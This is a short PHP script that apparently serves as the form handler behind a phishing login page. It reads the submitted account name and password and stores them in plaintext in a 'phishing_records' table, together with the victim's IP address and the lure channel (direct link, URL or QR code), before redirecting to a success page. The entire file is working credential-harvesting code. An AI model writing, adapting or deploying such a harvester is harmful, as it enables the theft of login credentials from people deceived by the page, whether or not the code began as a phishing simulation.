<?php
session_start();
require 'config.php';

$allowed = ['direct', 'url', 'qrcode'];
$channel = $_SESSION['channel'] ?? ($_POST['channel'] ?? 'direct');
if (!in_array($channel, $allowed, true)) {
    $channel = 'direct';
}

$account = trim($_POST['account'] ?? '');
$password = $_POST['password'] ?? '';

if ($account === '' || $password === '') {
    header('Location: login.php?from=' . urlencode($channel) . '&err=empty');
    exit;
}

$stmt = db()->prepare(
    'INSERT INTO phishing_records (account, password, ip, channel) VALUES (?,?,?,?)'
);
$stmt->execute([$account, $password, $_SERVER['REMOTE_ADDR'] ?? '', $channel]);

header('Location: success.php');
exit;
